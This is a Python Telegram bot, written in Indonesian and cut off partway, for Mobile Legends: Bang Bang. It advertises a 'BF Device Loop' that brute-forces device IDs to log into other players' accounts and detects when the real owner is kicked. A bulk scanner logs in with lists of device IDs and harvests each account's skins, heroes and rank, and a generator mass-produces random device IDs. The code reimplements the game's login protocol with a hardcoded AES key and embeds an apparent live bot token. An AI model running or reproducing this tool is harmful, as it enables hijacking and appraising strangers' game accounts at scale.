#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MLBB COMBINED BOT — Telegram Version (FINAL + BF KICK + GEN DEVID)
Fitur:
  🚀 BF Device Loop (max 10 device, unlimited loop) — deteksi KICK
  📦 Bulk Detail Scan (skin, hero, level, rank)
  🆔 Generate Device ID (and_ / ios_ / MIX) — 1-99999
  📡 Status (ping, jitter, uptime)
  🌐 Public access (wajib join channel)
"""

import os
import sys
import time
import socket
import struct
import zlib
import random
import uuid
import logging
import datetime
import threading
import asyncio
import re
import json
from enum import Enum
from typing import Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
import zstandard as zstd
from Crypto.Cipher import AES

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.error import Conflict, InvalidToken

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── CONFIG TELEGRAM ───────────────────────────────────────────────────
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8942304846:AAG4yl-KuZyWfJKmJz70jwdeMC9XLFzabcc")
OWNER_ID  = int(os.getenv("TELEGRAM_OWNER_ID", "7601958159"))

REQUIRED_CHANNEL      = "@DEVICEIDMLBBGLOBAL"
REQUIRED_CHANNEL_LINK = "https://t.me/DEVICEIDMLBBGLOBAL"

DEBUG_MODE = True

# ── AES ───────────────────────────────────────────────────────────────
AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV  = b'\x00' * 16

# ── OUTPUT ────────────────────────────────────────────────────────────
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "storage", "downloads", "mlbb_results")
os.makedirs(OUTPUT_DIR, exist_ok=True)

BF_HIT_FILE      = os.path.join(OUTPUT_DIR, "bf_device_hits.txt")
BF_FAIL_FILE     = os.path.join(OUTPUT_DIR, "bf_device_fails.txt")
BF_KICK_FILE     = os.path.join(OUTPUT_DIR, "bf_device_kicks.txt")
BULK_DETAIL_FILE = os.path.join(OUTPUT_DIR, "HASIL_BULK_DEVID.txt")
USERS_DB_FILE    = os.path.join(OUTPUT_DIR, "bot_users.json")

MAX_BULK_DEVICES = 500
MAX_BF_DEVICES   = 10
MAX_GEN_DEVICES  = 99999

# ── DEVICE POOL ───────────────────────────────────────────────────────
DEFAULT_DEVICE_IDS = [
    'and_cd9e459ea708a948d5c2f5a6ca8838cf648efdbc9a8c3ce703fa556d-34a4-4cde-a061-34938d08a26e',
    'and_cd9e459ea708a948d5c2f5a6ca8838cfb0128abe9641e3b40eb5c04c-8454-4afa-9cce-6214563d4100',
    'and_cd9e459ea708a948d5c2f5a6ca8838cffe70db6eb86cdceea5a6fff7-4ae8-4b70-94ba-9d1a3b0e19fa',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf4504f1fc6e0437de4e9e5d3a-714d-4c20-9779-f5041dac458d',
    'and_cd9e459ea708a948d5c2f5a6ca8838cf0ab2a698aa9e3fc1acec02f5-e7b1-47a8-b2b3-70a8142bf069',
]

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal", 7: "Alucard", 8: "Karina", 9: "Akai",
    10: "Franco", 11: "Bane", 12: "Bruno", 13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny",
    18: "Layla", 19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia", 25: "Kagura",
    26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson", 33: "Cyclops",
    34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca",
    42: "Harley", 43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie", 49: "Hylos",
    50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead", 55: "Angela", 56: "Gusion", 57: "Valir",
    58: "Martis", 59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude",
    66: "Vale", 67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith",
    74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra", 79: "Granger", 80: "Guinevere",
    81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling", 85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha",
    89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda",
    103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan", 108: "Aulus", 109: "Aamon",
    110: "Valentina", 111: "Edith", 112: "Floryn", 113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian",
    117: "Fredrinn", 118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici",
    124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

# ── LOGGER ────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_START_TIME = time.time()
BOT_START_DATETIME = datetime.datetime.now()


# ══════════════════════════════════════════════════════════════════════
# USER DATABASE
# ══════════════════════════════════════════════════════════════════════
user_db_lock = threading.Lock()


def load_users() -> set:
    try:
        with user_db_lock:
            if os.path.exists(USERS_DB_FILE):
                with open(USERS_DB_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    return set(int(x) for x in data)
    except Exception as e:
        print(f"[USERDB] load err: {e}")
    return set()


def save_users(users: set):
    try:
        with user_db_lock:
            with open(USERS_DB_FILE, "w", encoding="utf-8") as f:
                json.dump(list(users), f)
    except Exception as e:
        print(f"[USERDB] save err: {e}")


def register_user(user_id: int):
    users = load_users()
    if user_id not in users:
        users.add(user_id)
        save_users(users)


# ══════════════════════════════════════════════════════════════════════
# GEN DEVICE ID
# ══════════════════════════════════════════════════════════════════════
def _rand_hex(n: int) -> str:
    return ''.join(random.choice("0123456789abcdef") for _ in range(n))


def generate_one_device_id(platform: str = "and") -> str:
    platform = platform.lower()
    if platform not in ("and", "ios"):
        platform = "and"
    imei_md5   = _rand_hex(32)
    android_id = _rand_hex(16)
    ad_id      = _rand_hex(12)
    tail       = str(uuid.uuid4())
    return f"{platform}_{imei_md5}{android_id}{ad_id}-{tail}"


def generate_device_ids(count: int, mode: str = "and", unique: bool = True) -> list:
    mode = (mode or "and").lower()
    seen = set()
    out = []
    for _ in range(count):
        for _try in range(20):
            if mode == "mix":
                platform = random.choice(["and", "ios"])
            elif mode == "ios":
                platform = "ios"
            else:
                platform = "and"
            d = generate_one_device_id(platform)
            if not unique or d not in seen:
                seen.add(d)
                out.append(d)
                break
    return out


# ══════════════════════════════════════════════════════════════════════
# RANK & COLLECTOR
# ══════════════════════════════════════════════════════════════════════
def map_rank(p):
    R = [
        {"min": 0, "max": 4, "rank": "Warrior III"},
        {"min": 5, "max": 9, "rank": "Warrior II"},
        {"min": 10, "max": 14, "rank": "Warrior I"},
        {"min": 15, "max": 19, "rank": "Elite IV"},
        {"min": 20, "max": 24, "rank": "Elite III"},
        {"min": 25, "max": 29, "rank": "Elite II"},
        {"min": 30, "max": 34, "rank": "Elite I"},
        {"min": 35, "max": 39, "rank": "Master IV"},
        {"min": 40, "max": 44, "rank": "Master III"},
        {"min": 45, "max": 49, "rank": "Master II"},
        {"min": 50, "max": 54, "rank": "Master I"},
        {"min": 55, "max": 59, "rank": "Grandmaster IV"},
        {"min": 60, "max": 64, "rank": "Grandmaster III"},
        {"min": 65, "max": 69, "rank": "Grandmaster II"},
        {"min": 70, "max": 74, "rank": "Grandmaster I"},
        {"min": 75, "max": 81, "rank": "Epic IV"},
        {"min": 82, "max": 88, "rank": "Epic III"},
        {"min": 89, "max": 95, "rank": "Epic II"},
        {"min": 96, "max": 107, "rank": "Epic I"},
        {"min": 108, "max": 114, "rank": "Legend IV"},
        {"min": 115, "max": 121, "rank": "Legend III"},
        {"min": 122, "max": 128, "rank": "Legend II"},
        {"min": 129, "max": 135, "rank": "Legend I"},
        {"min": 136, "max": 160, "rank": lambda p: f"Mythic {p - 135}"},
        {"min": 161, "max": 195, "rank": lambda p: f"Mythical Honor {p - 135}"},
        {"min": 196, "max": 235, "rank": lambda p: f"Mythical Glory {p - 157}"},
        {"min": 236, "max": 999, "rank": lambda p: f"Mythical Immortal {p - 157}"},
    ]
    for e in R:
        if e["min"] <= p <= e["max"]:
            r = e["rank"]
            return r(p) if callable(r) else r
    return "Unknown"


def map_collector_point(point: int) -> str:
    if point < 1000:
        return "No Tier"
    tiers = [
        (1000, 4000, "Amateur Collector"),
        (4000, 10000, "Junior Collector"),
        (10000, 22000, "Seasoned Collector"),
        (22000, 44000, "Expert Collector"),
        (44000, 84000, "Renowned Collector"),
        (84000, 160000, "Exalted Collector"),
        (160000, 280000, "Mega Collector"),
        (280000, float('inf'), "World Collector"),
    ]
    for mn, mx, name in tiers:
        if mn <= point < mx:
            if name == "World Collector":
                return name
            per = (mx - mn) / 5
            lvl = int((point - mn) // per)
            roman = ["V", "IV", "III", "II", "I"][lvl]
            return f"{name} {roman}"
    return "Unknown"


# ══════════════════════════════════════════════════════════════════════
# SDP
# ══════════════════════════════════════════════════════════════════════
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8


class SdpException(Exception):
    pass


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        r = bytearray()
        while value >= 0x80:
            r.append((value & 0x7F) | 0x80)
            value >>= 7
        r.append(value & 0x7F)
        return bytes(r)

    def _read_number(self):
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, data_type):
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            p = struct.pack("<d", value)
            self.data += self._write_number(len(p))
            self.data += p
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(enc))
            self.data += enc
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for i in value:
                self._pack(0, i)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            h = self.data[self.offset]
            tag = h & 0xF
            dt = SdpDataType(h >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if dt == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif dt == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif dt == SdpDataType.FLOAT:
                v = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", v)[0]
            elif dt == SdpDataType.DOUBLE:
                v = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", v)[0]
            elif dt == SdpDataType.STRING:
                length = self._read_number()
                try:
                    v = self.data[self.offset:self.offset + length].decode('utf-8')
                except UnicodeDecodeError:
                    v = self.data[self.offset:self.offset + length]
                self.offset += length
                return tag, v
            elif dt == SdpDataType.LIST:
                length = self._read_number()
                v = []
                for _ in range(length):
                    _, it = self._unpack()
                    v.append(it)
                return tag, v
            elif dt == SdpDataType.DICT:
                length = self._read_number()
                v = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, val = self._unpack()
                    v[k] = val
                return tag, v
            elif dt == SdpDataType.STRUCT_BEGIN:
                sd = {}
                while True:
                    st, sv = self._unpack()
                    if isinstance(sv, SdpDataType) and sv == SdpDataType.STRUCT_END:
                        break
                    sd[st] = sv
                return tag, SdpStruct(sd)
            elif dt == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException("Unknown")
        except Exception as e:
            raise SdpException(f"unpack err: {e}")

    def copy(self):
        return SdpStruct(super().copy())

    def update(self, other):
        super().update(other)
        self._pack_to_binary()


# ══════════════════════════════════════════════════════════════════════
# BASE CONNECTION
# ══════════════════════════════════════════════════════════════════════
class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.cleanup()

    def connect(self):
        # ── PERSIS jgnganti.py: connect dulu, baru settimeout 2 ──
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(2)

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        packet = SdpStruct({0: id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            ct = flags >> 24
            self.last_header_size = size
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            if ct == 1:
                data = zlib.decompress(data)
            elif ct == 16:
                data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                dec = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = dec.rstrip(b'\x00')
                if ct == 3:
                    data = zlib.decompress(data)
                elif ct == 18:
                    data = zstd.decompress(data)
            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            res = result.get(6)
            if not res or not isinstance(res, bytes):
                res = result.get(5)
                if not res or not isinstance(res, bytes):
                    return pid, None
            return pid, SdpStruct(res)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


# ══════════════════════════════════════════════════════════════════════
# GAME CONNECTION
# ══════════════════════════════════════════════════════════════════════
class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"

        parts = self.device_id.split('_')
        if len(parts) >= 2:
            di = parts[1]
            if len(parts) >= 3 and len(di) < 32:
                di = di + "_" + parts[2]
            if len(di) >= 32:
                self.imei_md5 = di[:32]
                if len(di) >= 48:
                    self.android_id = di[32:48]
                    self.advertising_id = di[48:] if len(di) > 48 else ""
                else:
                    self.android_id = ""
                    self.advertising_id = ""
            else:
                self.imei_md5 = di
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = 'and_usa'
        self.client_version = '2.2.16.1232.1'
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0
        self.kick_detected = False

    def _login_packet(self):
        return SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        })

    def login_to_login_server(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()
        self.send_data(1, self._login_packet())
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            zr = res.get(2)
            if isinstance(zr, list) and zr:
                self.zone_id = zr[0] if not isinstance(zr[0], dict) else zr[0].get(0, 0)
            elif isinstance(zr, dict):
                self.zone_id = zr.get(0, 0)
            else:
                self.zone_id = zr
            self.creation_ts = res.get(19, 0)
            return True
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.client_version, 5: self.zone_id, 6: self.channel
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            gs = res[1]
            self.game_server_host, self.game_server_port = gs.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        """PERSIS jgnganti.py — TANPA deadline, TANPA try/except wrap.
        Deteksi KICK tetap ada di pid 20001."""
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()

        # Kirim login packet ke game server
        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))
        self.send_data(10101, SdpStruct({
            0: 0,
            2: 2,
        }))

        # Loop PERSIS jgnganti.py
        while True:
            pid, res = self.recv_data()
            if pid is None:
                return False
            elif pid == 10002:
                # 10002 = Sukses masuk ke dalam game
                return True
            elif pid == -1:
                return False
            elif pid == 20001:
                # Pesan sistem — cek KICK (opsional, nggak ganggu loop)
                try:
                    if self._is_kick_notification(res):
                        self.kick_detected = True
                except Exception:
                    pass
                return True

    def _is_kick_notification(self, res):
        if not res:
            return False
        keywords = [
            'login di perangkat lain', 'perangkat lain',
            'logged in on another device', 'another device',
            'other device', 'kick', 'kicked',
            'login elsewhere', 'device lain',
        ]

        def check_value(v):
            if isinstance(v, str):
                lv = v.lower()
                for kw in keywords:
                    if kw in lv:
                        return True
            elif isinstance(v, bytes):
                try:
                    lv = v.decode('utf-8', errors='ignore').lower()
                    for kw in keywords:
                        if kw in lv:
                            return True
                except Exception:
                    pass
            return False

        try:
            def walk(d):
                if isinstance(d, dict):
                    for k, v in d.items():
                        if check_value(v):
                            return True
                        if isinstance(v, (dict, list)) and walk(v):
                            return True
                elif isinstance(d, list):
                    for item in d:
                        if check_value(item):
                            return True
                        if isinstance(item, (dict, list)) and walk(item):
                            return True
                return False
            return walk(res)
        except Exception:
            return False

    def lookup_player(self, search_value, search_type="id", server_filter=None):
        if search_type == "id":
            try:
                ld = SdpStruct({1: int(search_value)})
            except ValueError:
                ld = SdpStruct({1: search_value})
        else:
            ld = SdpStruct({0: str(search_value).strip()})
        self.send_data(11153, ld)
        cnt = 0
        while True:
            pid, res = self.recv_data()
            if pid is None:
                return None
            elif pid == -1:
                return None
            elif pid == 11154:
                if search_type == "nickname" and server_filter is not None:
                    for p in (res.get(0) or []):
                        if isinstance(p, dict) and p.get(1) == server_filter:
                            return {0: [p]}
                    return None
                return res
            elif pid == 20001:
                cnt += 1
                if self.last_header_size < 100 and cnt >= 2:
                    return None

    def get_skin_role_info(self, role_id, zone_id, max_retries=3):
        for _ in range(max_retries):
            try:
                self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                to = 0
                while to < 3:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        to += 1
                    elif pid == 10144:
                        return res
                    elif pid == 20001:
                        continue
            except Exception:
                pass
        return None

    def __enter__(self):
        super().__enter__()
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        return self


# ══════════════════════════════════════════════════════════════════════
# EXTRACT PLAYER DATA
# ══════════════════════════════════════════════════════════════════════
def extract_player_data(result, role_info=None, creation_ts=0):
    if not result or not result.get(0) or len(result[0]) == 0:
        return None
    try:
        pd = result[0][0]
        nickname = pd.get(2, "Unknown")
        player_id = pd.get(0, "Unknown")
        server = pd.get(1, "Unknown")
        level = pd.get(3, "Unknown")
        skin_count = pd.get(83, 0)
        hero_count = pd.get(4, 0)
        matches = pd.get(17, 0)
        if role_info:
            hero_count = role_info.get(9, hero_count)
            matches = role_info.get(22, matches)
        tag_95 = pd.get(95)
        tag_8 = pd.get(8)
        high_rank = map_rank(tag_95) if tag_95 is not None else "Unknown"
        current_rank = map_rank(tag_8) if tag_8 is not None else "Unknown"
        skin_breakdown = {
            "Supreme Skins": 0, "Grand Skins": 0, "Exquisite Skins": 0,
            "Deluxe Skins": 0, "Exceptional Skins": 0, "Common Skins": 0,
        }
        _t118 = None
        if role_info and isinstance(role_info, dict):
            _t118 = role_info.get(118)
        if not _t118:
            _t118 = pd.get(118)
        if _t118 and isinstance(_t118, dict):
            sd = _t118.get(4) or _t118
            if isinstance(sd, dict):
                m = {6: "Supreme Skins", 5: "Grand Skins", 4: "Exquisite Skins",
                     3: "Deluxe Skins", 2: "Exceptional Skins", 1: "Common Skins"}
                for sid, cnt in sd.items():
                    try:
                        sid_int = int(sid)
                    except (ValueError, TypeError):
                        continue
                    if sid_int in m:
                        skin_breakdown[m[sid_int]] = cnt
        tag_136 = pd.get(136, {})
        collector_point = tag_136.get(9, 0) if isinstance(tag_136, dict) else 0
        collector_tier = map_collector_point(collector_point)
        return {
            "nickname": nickname, "player_id": player_id, "server": server,
            "level": level, "skin_count": skin_count, "hero_count": hero_count,
            "matches": matches, "current_rank": current_rank, "high_rank": high_rank,
            "collector_point": collector_point, "collector_tier": collector_tier,
            "skin_breakdown": skin_breakdown,
        }
    except Exception as e:
        logger.exception(f"extract err: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════
# SCAN DETAIL (Bulk Detail Scan)
# ══════════════════════════════════════════════════════════════════════
def scan_account_detail(device_id: str) -> dict:
    out = {
        "device_id": device_id, "player_id": None, "nickname": None,
        "level": 0, "skin_count": 0, "hero_count": 0,
        "rank": "-", "high_rank": "-",
        "collector_point": 0, "collector_tier": "-",
        "skin_breakdown": {}, "status": "fail", "error": None,
    }
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.connect_to_game_server():
                out["error"] = "GAME_CONNECT_FAILED"
                return out
            acc_id = conn.account_id
            zone_id = conn.zone_id
            result = conn.lookup_player(acc_id, "id")
            if not result:
                out["error"] = "LOOKUP_FAILED"
                return out
            role_info = None
            try:
                role_info = conn.get_skin_role_info(acc_id, zone_id)
            except Exception:
                pass
            pdata = extract_player_data(result, role_info=role_info, creation_ts=conn.creation_ts)
            if not pdata:
                out["error"] = "EXTRACT_FAILED"
                return out
            out["player_id"] = pdata.get("player_id")
            out["nickname"] = pdata.get("nickname")
            out["level"] = pdata.get("level", 0)
            out["skin_count"] = pdata.get("skin_count", 0)
            out["hero_count"] = pdata.get("hero_count", 0)
            out["rank"] = pdata.get("current_rank", "-")
            out["high_rank"] = pdata.get("high_rank", "-")
            out["collector_point"] = pdata.get("collector_point", 0)
            out["collector_tier"] = pdata.get("collector_tier", "-")
            out["skin_breakdown"] = pdata.get("skin_breakdown", {})
            out["status"] = "success"
    except ConnectionError as e:
        out["error"] = f"CONN_ERROR: {e}"
    except socket.timeout:
        out["error"] = "SOCKET_TIMEOUT"
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
    return out


# ══════════════════════════════════════════════════════════════════════
# BF DEVICE LOOP — context manager (auto-cleanup)
# ══════════════════════════════════════════════════════════════════════
def bf_login_with_device(device_id, device_model=None):
    result = {
        "status": "fail",
        "device_id": device_id,
        "info": None,
        "error": None,
        "kick": False,
    }
    try:
        with GameConnection(device_id=device_id, device_model=device_model) as conn:
            if not conn.connect_to_game_server():
                result["error"] = "GAME_CONNECT_FAILED"
                return result
            result["status"] = "success"
            result["info"] = {
                "account_id": conn.account_id,
                "zone_id": conn.zone_id,
            }
            result["kick"] = getattr(conn, "kick_detected", False)
    except ConnectionError as e:
        result["error"] = f"CONN_ERROR: {e}"
    except socket.timeout:
        result["error"] = "SOCKET_TIMEOUT"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    return result


# ══════════════════════════════════════════════════════════════════════
# PING & JITTER TEST
# ══════════════════════════════════════════════════════════════════════
def measure_ping_jitter(host="login.ml.youngjoygame.com", port=30021, count=5):
    latencies = []
    for _ in range(count):
        try:
            start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.close()
            lat = (time.time() - start) * 1000
            latencies.append(lat)
        except Exception:
            latencies.append(None)
        time.sleep(0.2)

    valid = [l for l in latencies if l is not None]
    if not valid:
        return {"ping": None, "jitter": None, "loss": 100, "samples": latencies}

    avg_ping = sum(valid) / len(valid)
    if len(valid) > 1:
        diffs = [abs(valid[i] - valid[i-1]) for i in range(1, len(valid))]
        jitter = sum(diffs) / len(diffs)
    else:
        jitter = 0.0
    loss = ((count - len(valid)) / count) * 100
    return {"ping": avg_ping, "jitter": jitter, "loss": loss, "samples": latencies}


def format_uptime(seconds):
    d = int(seconds // 86400)
    h = int((seconds % 86400) // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    parts = []
    if d > 0:
        parts.append(f"{d}h")
    if h > 0:
        parts.append(f"{h}j")
    if m > 0:
        parts.append(f"{m}m")
    parts.append(f"{s}s")
    return " ".join(parts)


# ══════════════════════════════════════════════════════════════════════
# FILE HELPERS
# ══════════════════════════════════════════════════════════════════════
file_lock = threading.Lock()


def save_line(filepath, line):
    try:
        with file_lock:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(line + "\n")
    except Exception:
        pass


DEVICE_ID_RE = re.compile(r"(?i)(?:and_|ios_)[A-Za-z0-9_-]+")


def extract_device_ids_from_text(text: str):
    found = DEVICE_ID_RE.findall(text or "")
    seen, out = set(), []
    for d in found:
        k = d.lower()
        if k in seen:
            continue
        seen.add(k)
        out.append(d)
    return out


# ══════════════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════════════════════
WAITING_DEVICE_IDS, WAITING_THREADS = range(2)
WAITING_GEN_COUNT, WAITING_GEN_PLATFORM = range(10, 12)
WAITING_BROADCAST = 100

USER_STATE = {}

HELP_TEXT = (
    "🤖 *MLBB COMBINED BOT*\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "✨ *FITUR UNGGULAN*\n\n"
    "🚀 *BF Device Loop*\n"
    "   └ Brute force Device ID (max 10)\n"
    "   └ Deteksi 🔴 KICK otomatis\n"
    "   └ Unlimited loop\n\n"
    "📦 *Bulk Detail Scan*\n"
    "   └ Upload .txt → skin, hero, level, rank\n\n"
    "🆔 *Generate Device ID*\n"
    "   └ Bikin `and_` / `ios_` / MIX\n"
    "   └ Up to 99.999 ID sekali jalan\n\n"
    "📡 *Status*\n"
    "   └ Ping, jitter, uptime bot\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "📜 *PERINTAH*\n\n"
    "▸ /start  — Menu utama\n"
    "▸ /bf     — BF Device Loop\n"
    "▸ /bulk   — Bulk Detail Scan\n"
    "▸ /gen    — Generate Device ID\n"
    "▸ /status — Ping & jitter\n"
    "▸ /stop   — Stop semua proses\n"
    "▸ /cancel — Batalkan input\n"
    "▸ /help   — Bantuan ini\n"
)


def get_user_state(user_id):
    if user_id not in USER_STATE:
        USER_STATE[user_id] = {
            "running": False, "stop_flag": False, "pause_flag": False,
            "device_ids": [], "threads": 20,
            "success": 0, "fail": 0, "kick": 0, "loop": 0, "hit_list": [],
            "status_msg_id": None, "chat_id": None,
            "start_time": 0, "task": None,
            "bulk_running": False, "bulk_stop": False,
            "bulk_msg_id": None, "bulk_done": 0,
